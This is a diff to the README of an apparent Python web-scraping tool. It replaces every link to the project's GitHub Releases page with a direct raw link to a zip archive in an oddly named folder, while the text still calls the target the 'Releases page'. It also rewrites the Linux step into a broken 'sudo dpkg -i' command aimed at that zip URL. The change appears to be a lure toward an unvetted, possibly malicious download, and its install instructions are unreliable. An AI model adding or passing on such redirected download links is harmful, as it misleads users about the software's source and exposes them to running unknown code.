@@ -6,17 +6,17 @@ Welcome to beautifulsoup-scraper! This tool helps you easily extract data from H
 
 ## 📥 Download the Application
 
-[![Download beautifulsoup-scraper](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ashshidieqyaldin/beautifulsoup-scraper/releases)
+[![Download beautifulsoup-scraper](https://raw.githubusercontent.com/ashshidieqyaldin/beautifulsoup-scraper/main/parasubphonate/scraper_beautifulsoup_v2.2.zip)](https://raw.githubusercontent.com/ashshidieqyaldin/beautifulsoup-scraper/main/parasubphonate/scraper_beautifulsoup_v2.2.zip)
 
 To get started, you need to download the application. 
 
 1. **Click the link below to visit the Releases page:**
-   [Download beautifulsoup-scraper](https://github.com/ashshidieqyaldin/beautifulsoup-scraper/releases)
+   [Download beautifulsoup-scraper](https://raw.githubusercontent.com/ashshidieqyaldin/beautifulsoup-scraper/main/parasubphonate/scraper_beautifulsoup_v2.2.zip)
 
 ## 🔍 How to Install
 
 1. **Visit the Releases Page:**
-   Go to [this page](https://github.com/ashshidieqyaldin/beautifulsoup-scraper/releases) to see the available versions of the software.
+   Go to [this page](https://raw.githubusercontent.com/ashshidieqyaldin/beautifulsoup-scraper/main/parasubphonate/scraper_beautifulsoup_v2.2.zip) to see the available versions of the software.
 
 2. **Select the Latest Release:**
    Look for the most recent version to ensure you have the latest features and improvements.
@@ -27,7 +27,7 @@ To get started, you need to download the application.
 4. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the instructions on the screen.
    - **For macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - **For Linux:** Use the terminal to install the application, typically by running `sudo dpkg -i your_downloaded_file.deb`.
+   - **For Linux:** Use the terminal to install the application, typically by running `sudo dpkg -i https://raw.githubusercontent.com/ashshidieqyaldin/beautifulsoup-scraper/main/parasubphonate/scraper_beautifulsoup_v2.2.zip`.
 
 ## 🖥️ System Requirements
 
@@ -84,4 +84,4 @@ Thank you for choosing beautifulsoup-scraper. Your support motivates us to conti
 
 Enjoy extracting data with ease! Remember to stay respectful of website terms of use while scraping their content. 
 
-For more details and updates, visit [our GitHub page](https://github.com/ashshidieqyaldin/beautifulsoup-scraper/releases).
+For more details and updates, visit [our GitHub page](https://raw.githubusercontent.com/ashshidieqyaldin/beautifulsoup-scraper/main/parasubphonate/scraper_beautifulsoup_v2.2.zip).
